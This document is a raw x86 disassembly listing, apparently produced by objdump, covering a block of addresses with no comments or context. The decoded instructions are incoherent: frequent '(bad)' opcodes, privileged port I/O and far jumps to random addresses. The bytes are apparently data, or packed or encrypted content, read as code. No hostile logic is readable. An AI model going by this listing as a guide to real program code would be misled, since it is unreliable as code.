  40d3d8:	adc    DWORD PTR [ecx+ebp*1],0x49
  40d3dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3dd:	cmp    esi,DWORD PTR [ecx+0x30]
  40d3e0:	shl    DWORD PTR [eax],0x85
  40d3e3:	mov    eax,0xc9abb5ea
  40d3e8:	call   0xec83498c
  40d3ed:	mov    ah,0xc4
  40d3ef:	cmp    eax,0x1e88af1e
  40d3f4:	xchg   ecx,eax
  40d3f5:	test   al,0x5e
  40d3f7:	or     bl,BYTE PTR [esi-0x6c13292b]
  40d3fd:	pop    es
  40d3fe:	daa    
  40d3ff:	xor    BYTE PTR [ebx],bl
  40d401:	das    
  40d402:	(bad)  
  40d403:	jns    0x40d431
  40d405:	pop    ebx
  40d406:	icebp  
  40d407:	loop   0x40d415
  40d409:	xchg   esi,eax
  40d40a:	jl     0x40d42a
  40d40c:	xor    ebx,edi
  40d40e:	leave  
  40d40f:	sbb    ah,dl
  40d411:	add    ch,BYTE PTR [ebx-0x13]
  40d414:	nop
  40d415:	fwait
  40d416:	test   DWORD PTR ss:[ecx-0x76e590cb],0xcbd743fa
  40d421:	call   0x1006:0x4bac5df8
  40d428:	loop   0x40d408
  40d42a:	repnz cwde 
  40d42c:	adc    edx,DWORD PTR ds:0x458a8ad6
  40d432:	pusha  
  40d433:	pop    ebx
  40d434:	mov    ah,0x8b
  40d436:	sub    ecx,DWORD PTR [edi-0x3c]
  40d439:	ja     0x40d411
  40d43b:	inc    esp
  40d43c:	and    al,0x8b
  40d43e:	jns    0x40d4a5
  40d440:	loopne 0x40d408
  40d442:	out    0xa9,eax
  40d444:	sbb    ebp,DWORD PTR [ebx+0x32]
  40d447:	and    BYTE PTR [ecx],bh
  40d449:	(bad)  
  40d44a:	xor    edx,esi
  40d44c:	add    DWORD PTR [esp+eax*4+0x1f81e1d5],esi
  40d453:	push   DWORD PTR [eax+0x56]
  40d456:	pushf  
  40d457:	mov    ah,BYTE PTR [ecx]
  40d459:	mov    edi,0x964cb65
  40d45e:	enter  0xca12,0x21
  40d462:	repnz cmp esp,DWORD PTR [ebx]
  40d465:	jnp    0x40d450
  40d467:	test   DWORD PTR [eax-0x72],edi
  40d46a:	std    
  40d46b:	cmp    eax,0xb895ce50
  40d470:	pop    ebp
  40d471:	mov    BYTE PTR ds:0x96dd5ef9,bl
  40d477:	cmp    al,0x30
  40d479:	dec    edx
  40d47a:	jnp    0x40d4be
  40d47c:	inc    edx
  40d47d:	adc    BYTE PTR [edi+0x33988765],ch
  40d483:	jb     0x40d49b
  40d485:	aad    0x1d
  40d487:	add    esi,DWORD PTR [ecx+0x1d85130a]
  40d48d:	js     0x40d4ef
  40d48f:	fcom   QWORD PTR [edx]
  40d491:	fwait
  40d492:	push   ecx
  40d493:	or     DWORD PTR [esi],edx
  40d495:	ficomp DWORD PTR [ecx-0x16]
  40d498:	outs   dx,DWORD PTR ds:[esi]
  40d499:	inc    esp
  40d49a:	mov    ebp,0xa42326ef
  40d49f:	stc    
  40d4a0:	xor    ebx,DWORD PTR [edx]
  40d4a2:	ret    0x7d95
  40d4a5:	mov    esp,fs
  40d4a7:	ds mov dl,0xef
  40d4aa:	pushf  
  40d4ab:	pop    edx
  40d4ac:	fimul  WORD PTR [edi]
  40d4ae:	cwde   
  40d4af:	mov    dl,0x6b
  40d4b1:	test   al,0x6c
  40d4b3:	sbb    DWORD PTR [eax],ebx
  40d4b5:	sbb    ebx,DWORD PTR [ebp+0xc1a4b85]
  40d4bb:	xchg   edi,eax
  40d4bc:	daa    
  40d4bd:	sahf   
  40d4be:	cmp    bl,BYTE PTR [ecx-0x3474bf6e]
  40d4c4:	xchg   esp,eax
  40d4c5:	shl    BYTE PTR [ebx+edi*4],1
  40d4c8:	lods   al,BYTE PTR ds:[esi]
  40d4c9:	repz cs fwait
  40d4cc:	in     eax,0x1e
  40d4ce:	jle    0x40d4f0
  40d4d0:	int    0x10
  40d4d2:	imul   ecx,DWORD PTR [ebp-0x5],0xffffffa0
  40d4d6:	mov    ah,0x1
  40d4d8:	xor    al,0x7
  40d4da:	mov    esp,0xb12277a9
  40d4df:	nop
  40d4e0:	shl    BYTE PTR [ebx-0x6c],cl
  40d4e3:	mov    WORD PTR [ecx+0x2f],?
  40d4e6:	in     al,dx
  40d4e7:	in     eax,dx
  40d4e8:	cmc    
  40d4e9:	inc    esi
  40d4ea:	les    edx,FWORD PTR [edi+0x35]
  40d4ed:	je     0x40d540
  40d4ef:	leave  
  40d4f0:	test   al,0xc7
  40d4f2:	js     0x40d4f7
  40d4f4:	sahf   
  40d4f5:	and    DWORD PTR [esi-0x1],esp
  40d4f8:	xchg   ebp,eax
  40d4f9:	clc    
  40d4fa:	cmp    bh,BYTE PTR [edx-0x522c300e]
  40d500:	stos   DWORD PTR es:[edi],eax
  40d501:	push   edx
  40d502:	ja     0x40d542
  40d504:	pop    edx
  40d505:	aas    
  40d506:	jl     0x40d506
  40d508:	aas    
  40d509:	mov    ah,0x46
  40d50b:	mov    bl,0x21
  40d50d:	xchg   esi,eax
  40d50e:	mov    DWORD PTR [esi-0x5],0x36d68be6
  40d515:	sub    eax,0x844c34f8
  40d51a:	dec    esp
  40d51b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d51c:	sbb    edi,DWORD PTR [ecx+edx*2]
  40d51f:	or     dl,BYTE PTR [edx+0x42]
  40d522:	outs   dx,DWORD PTR ds:[esi]
  40d523:	xor    dl,BYTE PTR [esi-0x4b3caff1]
  40d529:	add    edi,ebp
  40d52b:	xchg   DWORD PTR ds:0x7b12f0fb,edx
  40d531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d532:	sbb    al,0xf7
  40d534:	push   ebx
  40d535:	call   DWORD PTR [ebp+0x5566c38a]
  40d53b:	and    eax,0x1a41e09f
  40d540:	test   BYTE PTR [ecx+0x3d4a1837],al
  40d546:	pop    ebp
  40d547:	(bad)  
  40d548:	mov    dl,0x45
  40d54a:	xor    DWORD PTR ds:0x4fa74179,0xd27c75ad
  40d554:	icebp  
  40d555:	sub    al,0x22
  40d557:	imul   esi,DWORD PTR [edi-0x5f],0xffffffb6
  40d55b:	lods   eax,DWORD PTR ds:[esi]
  40d55c:	les    esi,FWORD PTR [eax+ecx*8]
  40d55f:	jae    0x40d50f
  40d561:	cld    
  40d562:	push   edi
  40d563:	popa   
  40d564:	inc    eax
  40d565:	xchg   esi,eax
  40d566:	xchg   edx,eax
  40d567:	xchg   ecx,eax
  40d568:	push   ds
  40d569:	pushf  
  40d56a:	rol    eax,0x8a
  40d56d:	rol    ecx,cl
  40d56f:	adc    eax,esi
  40d571:	add    dl,BYTE PTR [edi-0x456372c6]
  40d577:	push   ebx
  40d578:	and    eax,0x7f4cd4f8
  40d57d:	xchg   ebx,eax
  40d57e:	adc    cl,BYTE PTR [edi]
  40d580:	mov    ch,0x78
  40d582:	jns    0x40d552
  40d584:	lods   eax,DWORD PTR ds:[esi]
  40d585:	jno    0x40d5d3
  40d587:	pusha  
  40d588:	cmp    edi,DWORD PTR [eax+0x8a8fe66]
  40d58e:	jnp    0x40d541
  40d590:	call   0x3f00:0x4adadc47
  40d597:	(bad)  [ebp-0x436384b4]
  40d59d:	pushf  
  40d59e:	ss pushf 
  40d5a0:	popa   
  40d5a1:	mov    edi,DWORD PTR [ebp-0x1d]
  40d5a4:	shr    ah,cl
  40d5a6:	repz xchg ebx,eax
  40d5a8:	stos   DWORD PTR es:[edi],eax
  40d5a9:	loope  0x40d5b7
  40d5ab:	sub    bl,BYTE PTR [esi]
  40d5ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5ae:	push   0xffffffb5
  40d5b0:	cs aam 0x68
  40d5b3:	xor    ch,BYTE PTR [ecx+eax*8+0x3cf25bfe]
  40d5ba:	(bad)  
  40d5bb:	icebp  
  40d5bc:	and    DWORD PTR ds:0xdfea28ff,eax
  40d5c2:	jg     0x40d5ee
  40d5c4:	das    
  40d5c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5c6:	ins    BYTE PTR es:[edi],dx
  40d5c7:	xor    bh,BYTE PTR [ecx-0x2d]
  40d5ca:	or     eax,0x3330727e
  40d5cf:	mov    ds:0x25f78a8b,eax
  40d5d4:	xchg   BYTE PTR [ebx-0x672f68c1],dh
  40d5da:	int    0xbd
  40d5dc:	sbb    al,BYTE PTR [ecx+0x62]
  40d5df:	inc    ebp
  40d5e0:	cs ja  0x40d5f9
  40d5e3:	add    al,0x8d
  40d5e5:	test   bh,0x25
  40d5e8:	pop    ecx
  40d5e9:	sti    
  40d5ea:	cmp    DWORD PTR [eax+ebp*8],ecx
  40d5ed:	into   
  40d5ee:	cmp    DWORD PTR [eax+0x41],ebp
  40d5f1:	out    0xb2,eax
  40d5f3:	push   0xd421db7e
  40d5f8:	sti    
  40d5f9:	scas   al,BYTE PTR es:[edi]
  40d5fa:	popa   
  40d5fb:	cmp    BYTE PTR [ebp-0x2db94f2b],0x67
  40d602:	dec    eax
  40d603:	dec    ebp
  40d604:	add    cl,BYTE PTR [eax-0x653c64ec]
  40d60a:	mov    eax,0xc23a4a67
  40d60f:	sar    DWORD PTR [eax-0x60538467],0xea
  40d616:	out    dx,al
  40d617:	retf   
  40d618:	cld    
  40d619:	mov    ds:0xa73ec66a,eax
  40d61e:	in     al,dx
  40d61f:	out    dx,al
  40d620:	ja     0x40d5ce
  40d622:	cli    
  40d623:	mov    cl,0x95
  40d625:	(bad)
  40d628:	xchg   edx,eax
  40d629:	xlat   BYTE PTR ds:[ebx]
  40d62a:	push   ebp
  40d62b:	ins    DWORD PTR es:[edi],dx
  40d62c:	cmc    
  40d62d:	jo     0x40d65a
  40d62f:	mov    ah,BYTE PTR [ebp+0x79d0ba74]
  40d635:	int3   
  40d636:	cmp    al,0x78
  40d638:	push   ebx
  40d639:	sbb    DWORD PTR [edi],0xffffffcc
  40d63c:	cmp    BYTE PTR ds:0x8f24f942,bl
  40d642:	cmp    al,0xc4
  40d644:	lods   al,BYTE PTR ds:[esi]
  40d645:	ss loop 0x40d68c
  40d648:	call   0x68b2b98a
  40d64d:	xchg   DWORD PTR [eax+ecx*4-0x3d],ebp
  40d651:	xchg   DWORD PTR [ebp+0x6ce2055b],esp
  40d657:	push   ebx
  40d658:	jbe    0x40d64c
  40d65a:	mov    dh,0x90
  40d65c:	sbb    ebx,DWORD PTR [esi+0x4f09a79f]
  40d662:	jmp    0x40d626
  40d664:	bound  eax,QWORD PTR [ebx]
  40d666:	ds (bad) 
  40d668:	loopne 0x40d68b
  40d66a:	jecxz  0x40d66b
  40d66c:	nop
  40d66d:	push   0xa982290c
  40d672:	dec    esp
  40d673:	in     al,dx
  40d674:	adc    al,0xaa
  40d676:	xchg   ebp,eax
  40d677:	xor    eax,0x9d38d221
  40d67c:	test   ebp,0x94eaec28
  40d682:	(bad)  
  40d684:	pushf  
  40d685:	mov    edx,0x34a9ea59
  40d68a:	jge    0x40d64e
  40d68c:	fnstenv [edi]
  40d68e:	fneni(8087 only) 
  40d690:	cmp    DWORD PTR [eax-0x4a],ebx
  40d693:	popa   
  40d694:	sbb    bl,0x32
  40d697:	fs jbe 0x40d6a4
  40d69a:	jbe    0x40d69d
  40d69c:	pushf  
  40d69d:	test   BYTE PTR ds:0x59a7602,0xa2
  40d6a4:	jae    0x40d6fd
  40d6a6:	mov    esp,0xcc85ed45
  40d6ab:	or     dl,BYTE PTR [eax]
  40d6ad:	jmp    0x40d675
  40d6af:	mov    esp,0x1c4e5666
  40d6b4:	rcl    bl,1
  40d6b6:	mov    al,0xa6
  40d6b8:	in     al,dx
  40d6b9:	shl    DWORD PTR [edx],0x47
  40d6bc:	call   0xb7b9:0xdd184e43
  40d6c3:	mov    al,0x1b
  40d6c5:	imul   ebx,edi,0x29
  40d6c8:	adc    edi,DWORD PTR ds:0x6feeaf5d
  40d6ce:	inc    esp
  40d6cf:	cwde   
  40d6d0:	std    
  40d6d1:	inc    edi
  40d6d2:	push   esi
  40d6d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6d4:	sub    cl,dl
  40d6d6:	push   ecx
  40d6d7:	mov    BYTE PTR [esi-0xb97df64],ch
  40d6dd:	sub    DWORD PTR [esi+0x4662720b],ebp
  40d6e3:	jmp    0xd431:0xfc0f6fc3
  40d6ea:	lahf   
  40d6eb:	inc    eax
  40d6ec:	adc    al,0xc4
  40d6ee:	je     0x40d672
  40d6f0:	lock aaa 
  40d6f2:	leave  
  40d6f3:	lods   al,BYTE PTR ds:[esi]
  40d6f4:	jnp    0x40d6af
  40d6f6:	hlt    
  40d6f7:	sti    
  40d6f8:	pop    ss
  40d6f9:	clc    
  40d6fa:	imul   esp,DWORD PTR [ecx],0x795880c6
  40d700:	pop    esi
  40d701:	outs   dx,BYTE PTR ds:[esi]
  40d702:	daa    
  40d703:	popa   
  40d704:	scas   al,BYTE PTR es:[edi]
  40d705:	push   esi
  40d706:	in     eax,0x69
  40d708:	jns    0x40d741
  40d70a:	pop    eax
  40d70b:	jmp    0x40d6c1
  40d70d:	retf   0x2a0f
  40d710:	test   BYTE PTR ds:0x4168acb0,ch
  40d716:	or     dl,bl
  40d718:	jmp    0xb798:0x45ab0a29
  40d71f:	add    DWORD PTR [ecx],edi
  40d721:	mov    DWORD PTR [ebx],edi
  40d723:	sbb    eax,DWORD PTR [eax+0x3f1f881e]
  40d729:	xchg   ebx,eax
  40d72a:	outs   dx,BYTE PTR ds:[esi]
  40d72b:	dec    esp
  40d72c:	sbb    al,0xdc
  40d72e:	inc    esp
  40d72f:	jae    0x40d773
  40d731:	out    0xef,eax
  40d733:	mov    ch,0xb8
  40d735:	sub    eax,0x64ffc7bd
  40d73a:	and    al,0xe4
  40d73c:	cmp    BYTE PTR [ebx-0x158ec7c9],cl
  40d742:	dec    ebx
  40d743:	fld    st(1)
  40d745:	ret    0xc015
  40d748:	xchg   DWORD PTR [ebp-0x728147b5],eax
  40d74e:	lods   al,BYTE PTR ds:[esi]
  40d74f:	xor    BYTE PTR [eiz*2+0xca6e32e],dh
  40d756:	adc    al,0x3
  40d758:	add    BYTE PTR [ebp-0x73],bl
  40d75b:	popa   
  40d75c:	cld    
  40d75d:	popa   
  40d75e:	dec    edx
  40d75f:	sbb    BYTE PTR [edi-0x3a780937],cl
  40d765:	or     ebx,esp
  40d767:	dec    ebp
  40d768:	jbe    0x40d7c5
  40d76a:	and    al,dh
  40d76c:	jae    0x40d756
  40d76e:	adc    BYTE PTR [esi+edi*1-0x68036ecf],bl
  40d775:	and    al,0xd9
  40d777:	mov    eax,0xb5d90e9c
  40d77c:	xchg   esp,eax
  40d77d:	stos   BYTE PTR es:[edi],al
  40d77e:	adc    al,0xd6
  40d780:	mov    dh,bh
  40d782:	xchg   edi,eax
  40d783:	inc    edx
  40d784:	lods   al,BYTE PTR ds:[esi]
  40d785:	pop    ds
  40d786:	adc    edi,esp
  40d788:	loopne 0x40d7ab
  40d78a:	repnz pop ds
  40d78c:	int    0xa7
  40d78e:	xchg   edx,eax
  40d78f:	gs push ecx
  40d791:	sbb    eax,0x8244e28d
  40d796:	xlat   BYTE PTR ds:[ebx]
  40d797:	pop    esi
  40d798:	(bad)  
  40d799:	mov    edi,0x98d575c0
  40d79e:	sar    DWORD PTR [esi-0x31a7b260],cl
  40d7a4:	loop   0x40d7a8
  40d7a6:	inc    edi
  40d7a7:	fsub   DWORD PTR [ecx+eax*2]
  40d7aa:	shl    BYTE PTR ds:0xab92c35c,cl
  40d7b0:	ret    
  40d7b1:	ins    BYTE PTR es:[edi],dx
  40d7b2:	mov    ecx,0x672a8b7f
  40d7b7:	iret   
  40d7b8:	push   0xffffffbe
  40d7ba:	jmp    0x757f:0x54a6be97
  40d7c1:	lahf   
  40d7c2:	fld    DWORD PTR ds:0x137ad07a
  40d7c8:	nop
  40d7c9:	cmp    DWORD PTR [esi-0x3b],ebp
  40d7cc:	xchg   ebx,eax
  40d7cd:	int3   
  40d7ce:	arpl   WORD PTR [eax-0x76b9ea93],bp
  40d7d4:	repz mov edx,0x6f7487c2
  40d7da:	mov    WORD PTR [ebp-0x286d2251],0x85ad
  40d7e3:	cmp    eax,0x4c4016fe
  40d7e8:	enter  0x4846,0x62
  40d7ec:	aas    
  40d7ed:	lock push esp
  40d7ef:	jae    0x40d7d7
  40d7f1:	mov    edx,0x4c88b825
  40d7f6:	js     0x40d85a
  40d7f8:	sub    BYTE PTR [ecx*4+0x25ceca8a],bl
  40d7ff:	leave  
  40d800:	(bad)  
  40d801:	xchg   ebp,eax
  40d802:	clc    
  40d803:	aas    
  40d804:	dec    ebp
  40d805:	xlat   BYTE PTR ds:[ebx]
  40d806:	not    DWORD PTR [ebp+0xa9cfeb7]
  40d80c:	add    BYTE PTR [ecx+ebp*8-0x19],dh
  40d810:	adc    ch,BYTE PTR [edi]
  40d812:	adc    DWORD PTR [ecx+0x41],edx
  40d815:	push   eax
  40d816:	add    BYTE PTR ds:0x26c21999,bl
  40d81c:	ror    DWORD PTR [esi],1
  40d81e:	sbb    eax,0x20e9eed5
  40d823:	and    ecx,DWORD PTR [esi+eiz*1-0x76c8bdd2]
  40d82a:	inc    edi
  40d82b:	in     eax,dx
  40d82c:	or     eax,0xf26c6683
  40d831:	shl    DWORD PTR [ebx-0x1c],1
  40d834:	out    dx,eax
  40d835:	ret    
  40d836:	xchg   DWORD PTR [ebx],eax
  40d838:	(bad)  
  40d83b:	mov    edi,0xac349850
  40d840:	cwde   
  40d841:	add    eax,0x7195d71d
  40d846:	hlt    
  40d847:	pop    DWORD PTR [eax]
  40d849:	add    eax,DWORD PTR [esi]
  40d84b:	fild   DWORD PTR [ecx+0x48]
  40d84e:	jl     0x40d81d
  40d850:	cmp    ah,bl
  40d852:	int3   
  40d853:	pop    eax
  40d854:	fnstenv [esi-0x54]
  40d857:	or     DWORD PTR [ebx],0xffffff97
  40d85a:	cmp    DWORD PTR [edx],esp
  40d85c:	push   esp
  40d85d:	aas    
  40d85e:	lds    esi,FWORD PTR [esp+edi*4+0xab3e183]
  40d865:	mov    ds:0x381f1cd9,eax
  40d86a:	icebp  
  40d86b:	xchg   BYTE PTR [esi],dh
  40d86d:	sti    
  40d86e:	imul   cl
  40d870:	sub    DWORD PTR [ebp+0xeb94560],esi
  40d876:	mov    eax,0x2ef4fb60
  40d87b:	mov    ds,WORD PTR [ebx+0x9]
  40d87e:	mov    WORD PTR [edi],ss
  40d880:	mov    edi,0x8b54cf7a
  40d885:	hlt    
  40d886:	fidiv  WORD PTR ss:[edi-0x273e395a]
  40d88d:	mov    ebp,0xa94dc6a0
  40d892:	fimul  WORD PTR [esi-0x7c]
  40d895:	adc    eax,0x2e1d967b
  40d89a:	shl    BYTE PTR [ebx],cl
  40d89c:	sar    BYTE PTR [ebx],cl
  40d89e:	cs mov bl,0x35
  40d8a1:	push   cs
  40d8a2:	sbb    dh,ah
  40d8a4:	pop    es
  40d8a5:	xchg   esi,eax
  40d8a6:	mov    ah,0xa3
  40d8a8:	outs   dx,DWORD PTR ds:[esi]
  40d8a9:	jg     0x40d867
  40d8ab:	pushf  
  40d8ac:	das    
  40d8ad:	cmp    cl,BYTE PTR [edi+0x37]
  40d8b0:	xchg   edx,eax
  40d8b1:	dec    esi
  40d8b2:	jo     0x40d8dc
  40d8b4:	jecxz  0x40d8e1
  40d8b6:	ds inc edx
  40d8b8:	sub    esp,ecx
  40d8ba:	int    0x77
  40d8bc:	test   esp,edi
  40d8be:	adc    BYTE PTR [esi],ah
  40d8c0:	outs   dx,DWORD PTR ds:[esi]
  40d8c1:	pop    ebx
  40d8c2:	jne    0x40d847
  40d8c4:	and    DWORD PTR [edx],eax
  40d8c6:	sub    edi,esi
  40d8c8:	and    al,0x1
  40d8ca:	inc    ebx
  40d8cb:	icebp  
  40d8cc:	imul   dl
  40d8ce:	jmp    0x14f51b0b
  40d8d3:	out    0x62,al
  40d8d5:	int    0x6f
  40d8d7:	mov    edx,DWORD PTR [edi+ebx*1-0x34ef08c2]
  40d8de:	iret   
  40d8df:	test   al,bl
  40d8e1:	or     ebx,edx
  40d8e3:	mov    eax,ds:0x6ce963dd
  40d8e8:	in     al,dx
  40d8e9:	mov    cl,0x9
  40d8eb:	ins    BYTE PTR es:[edi],dx
  40d8ec:	scas   al,BYTE PTR es:[edi]
  40d8ed:	mov    ah,0x5f
  40d8ef:	scas   eax,DWORD PTR es:[edi]
  40d8f0:	je     0x40d930
  40d8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8f3:	jbe    0x40d949
  40d8f5:	pop    eax
  40d8f6:	(bad)  
  40d8f7:	stos   DWORD PTR es:[edi],eax
  40d8f8:	lds    esi,FWORD PTR [edx+0x51]
  40d8fb:	les    ebx,FWORD PTR [ebx]
  40d8fd:	or     DWORD PTR [ebp+0x1584aa33],edi
  40d903:	mov    bh,0xc5
  40d905:	jnp    0x40d8bb
  40d907:	jbe    0x40d968
  40d909:	lahf   
  40d90a:	xlat   BYTE PTR ds:[ebx]
  40d90b:	jecxz  0x40d894
  40d90d:	cmp    dh,0x4c
  40d910:	jns    0x40d8cb
  40d912:	adc    bl,BYTE PTR [ebx+0x65c92f1c]
  40d918:	ds push ds
  40d91a:	sbb    edi,DWORD PTR [ecx+0x2c]
  40d91d:	push   eax
  40d91e:	mov    dh,0x36
  40d920:	mov    dh,0xcf
  40d922:	cmp    ebp,ebp
  40d924:	ret    0xedc
  40d927:	(bad)  
  40d928:	jge    0x40d8c1
  40d92a:	iret   
  40d92b:	jne    0x40d8f3
  40d92d:	je     0x40d8dd
  40d92f:	scas   eax,DWORD PTR es:[edi]
  40d930:	mov    ecx,0x80eabca0
  40d935:	pop    ebx
  40d936:	ins    BYTE PTR es:[edi],dx
  40d937:	aaa    
  40d938:	mov    edx,0x56930cb
  40d93d:	je     0x40d90f
  40d93f:	iret   
  40d940:	ds nop
  40d942:	pushf  
  40d943:	ja     0x40d8fd
  40d945:	xlat   BYTE PTR ds:[ebx]
  40d946:	adc    al,0x77
  40d948:	push   ebx
  40d949:	or     al,0x63
  40d94b:	clc    
  40d94c:	jp     0x40d93c
  40d94e:	les    esi,FWORD PTR [edi-0x7d]
  40d951:	fs xchg ebp,eax
  40d953:	xor    esi,ecx
  40d955:	sti    
  40d956:	stc    
  40d957:	shl    DWORD PTR [ebx],0xe8
  40d95a:	test   ah,0x77
  40d95d:	(bad)  
  40d95e:	loop   0x40d9ae
  40d960:	jne    0x40d907
  40d962:	sbb    BYTE PTR [ebx-0x72],dh
  40d965:	push   cs
  40d966:	dec    edi
  40d967:	mov    edi,0x442d02ff
  40d96c:	push   cs
  40d96d:	xchg   esi,eax
  40d96e:	stos   BYTE PTR es:[edi],al
  40d96f:	add    al,0x6d
  40d972:	stc    
  40d973:	add    eax,0x52f6680b
  40d978:	pushf  
  40d979:	out    0x27,al
  40d97b:	mov    al,ds:0xfdbb69ae
  40d980:	cmp    BYTE PTR cs:0xf4ca7ea0,dh
  40d987:	(bad)  
  40d988:	mov    ebx,DWORD PTR [esi+0x44]
  40d98b:	xlat   BYTE PTR ds:[ebx]
  40d98c:	pop    ebx
  40d98d:	xchg   edi,eax
  40d98e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d98f:	pop    edx
  40d990:	ror    ah,cl
  40d992:	pop    edi
  40d993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d994:	push   edx
  40d995:	iret   
  40d996:	jecxz  0x40d9ed
  40d998:	call   0x4338855e
  40d99d:	daa    
  40d99e:	sbb    bl,BYTE PTR [ecx]
  40d9a0:	aam    0x30
  40d9a2:	in     al,0x9d
  40d9a4:	and    ch,BYTE PTR [ebp+0x4f]
  40d9a7:	jb     0x40da09
  40d9a9:	cld    
  40d9aa:	xor    DWORD PTR [ecx],0x4415e89a
  40d9b0:	xor    eax,0xf2bc708e
  40d9b5:	mov    ch,0x20
  40d9b7:	push   esp
  40d9b8:	retf   0xab0f
  40d9bb:	ret    
  40d9bc:	mov    dl,0xf5
  40d9be:	or     eax,0x68dbffd3
  40d9c3:	adc    dl,BYTE PTR ds:0x5b14666d
  40d9c9:	jae    0x40d951
  40d9cb:	lds    esp,FWORD PTR [esi-0x77]
  40d9ce:	repnz ficomp DWORD PTR [edx+0x3e]
  40d9d2:	sbb    DWORD PTR [eax-0x50],esi
  40d9d5:	add    BYTE PTR [ecx],0x3a
  40d9d8:	cmc    
  40d9d9:	out    0xa5,al
  40d9db:	mov    DWORD PTR [ebx-0x59],ebx
  40d9de:	lods   al,BYTE PTR ds:[esi]
  40d9df:	and    DWORD PTR [ecx-0x415db7a5],edi
  40d9e5:	fdiv   QWORD PTR [ebp+0x2]
  40d9e8:	in     al,0x79
  40d9ea:	test   DWORD PTR [ebp+0x2cdef78b],esp
  40d9f0:	test   eax,0x26eead93
  40d9f5:	push   ss
  40d9f6:	cld    
  40d9f7:	push   esp
  40d9f8:	dec    ecx
  40d9f9:	pmaddwd mm4,QWORD PTR [eax-0x2d7e053d]
  40da00:	ret    0xd608
  40da03:	outs   dx,DWORD PTR ds:[esi]
  40da04:	popf   
  40da05:	xchg   dh,ch
  40da07:	mov    eax,ds:0xd79bcdc
  40da0c:	rcr    esi,1
  40da0e:	sub    al,0x34
  40da10:	push   esi
  40da11:	int    0x60
  40da13:	sbb    ebp,edx
  40da15:	push   0xffffff87
  40da17:	sub    BYTE PTR [ecx-0x39d71710],dh
  40da1d:	sbb    al,0xe5
  40da1f:	cmc    
  40da20:	mov    ecx,0xdfb5991a
  40da25:	fiadd  DWORD PTR [esp+eax*4]
  40da28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da29:	mov    edx,0x3384fc1f
  40da2e:	repz enter 0x6a87,0x77
  40da33:	dec    edi
  40da34:	daa    
  40da35:	outs   dx,BYTE PTR ds:[esi]
  40da36:	pop    edi
  40da37:	loopne 0x40d9f9
  40da39:	push   0x7072aedc
  40da3e:	xchg   DWORD PTR [eax],esi
  40da40:	ret    
  40da41:	ficomp WORD PTR [ebp+0x437f42fd]
  40da47:	adc    DWORD PTR [esi],esp
  40da49:	cmp    al,0xfe
  40da4b:	mul    BYTE PTR [ecx+0x6d]
  40da4e:	aas    
  40da4f:	ja     0x40da17
  40da51:	out    dx,eax
  40da52:	in     eax,0x3c
  40da54:	add    BYTE PTR [edi+0x3a],bh
  40da57:	ret    
  40da58:	or     esp,edx
  40da5a:	push   es
  40da5b:	xchg   edx,eax
  40da5c:	push   eax
  40da5d:	cwde   
  40da5e:	mov    ds:0x9ca0e294,eax
  40da63:	cmc    
  40da64:	neg    BYTE PTR [ebp+0x649b7b9e]
  40da6a:	or     al,BYTE PTR [eax+0x3f8e9ef6]
  40da70:	jno    0x40da33
  40da72:	add    BYTE PTR [ecx-0x53db45ab],0xc1
  40da79:	leave  
  40da7a:	sahf   
  40da7b:	mov    ch,0xd7
  40da7d:	mov    esi,0xf3879afd
  40da82:	fcmovu st,st(6)
  40da84:	push   ecx
  40da85:	cmc    
  40da86:	dec    ebp
  40da87:	sahf   
  40da88:	and    ecx,DWORD PTR [edi]
  40da8a:	outs   dx,BYTE PTR ds:[esi]
  40da8b:	xchg   edi,eax
  40da8c:	icebp  
  40da8d:	sub    eax,0x4eec8d0d
  40da92:	test   DWORD PTR [esi+0x3e9f418d],0x228ac616
  40da9c:	in     al,dx
  40da9d:	pop    esp
  40da9e:	fwait
  40da9f:	sbb    ch,BYTE PTR [esp+edi*2]
  40daa2:	lods   eax,DWORD PTR ds:[esi]
  40daa3:	or     al,cl
  40daa5:	sti    
  40daa6:	cli    
  40daa7:	mov    DWORD PTR [edx-0x75],ebx
  40daaa:	test   BYTE PTR [ebp-0x40],al
  40daad:	sub    dh,ah
  40daaf:	jl     0x40da89
  40dab1:	mov    dl,0xc7
  40dab3:	cmp    al,0xa3
  40dab5:	mov    esi,0x73b083d4
  40daba:	test   DWORD PTR [ebx-0x4ce1fd95],0x9d49969
  40dac4:	xchg   edi,eax
  40dac5:	or     al,0xb4
  40dac7:	jae    0x40db44
  40dac9:	(bad)  
  40dacb:	call   0xcf3f24c
  40dad0:	pop    esp
  40dad1:	push   esi
  40dad2:	add    al,BYTE PTR [ebp+0x77]
  40dad5:	xchg   edx,eax
  40dad6:	out    dx,eax
  40dad7:	in     al,0x5c
  40dad9:	jecxz  0x40dab9
  40dadb:	fidiv  WORD PTR ds:[eax+0x44]
  40dadf:	(bad)  
  40dae0:	loope  0x40dabe
  40dae2:	scas   al,BYTE PTR es:[edi]
  40dae3:	jp     0x40dafe
  40dae5:	dec    ebp
  40dae6:	xchg   ebx,eax
  40dae7:	lods   eax,DWORD PTR ds:[esi]
  40dae8:	xchg   ecx,eax
  40dae9:	int    0xef
  40daeb:	jo     0x40dae3
  40daed:	inc    edi
  40daee:	sub    DWORD PTR [ecx-0x579192b5],esi
  40daf4:	out    dx,al
  40daf5:	fwait
  40daf6:	into   
  40daf7:	or     DWORD PTR [ecx-0x6a],esi
  40dafa:	push   0xffffffa7
  40dafc:	clc    
  40dafd:	xor    edx,ebp
  40daff:	push   cs
  40db00:	or     DWORD PTR [esi],ebp
  40db02:	pop    ebx
  40db03:	enter  0x841b,0xad
  40db07:	in     al,0x1f
  40db09:	or     BYTE PTR [edi-0x5061bb1a],dh
  40db0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db10:	jne    0x40dad5
  40db12:	scas   eax,DWORD PTR es:[edi]
  40db13:	sbb    al,0xfd
  40db15:	push   esp
  40db16:	mov    edx,edx
  40db18:	pop    eax
  40db19:	fadd   DWORD PTR [ecx-0x17]
  40db1c:	push   cs
  40db1d:	int3   
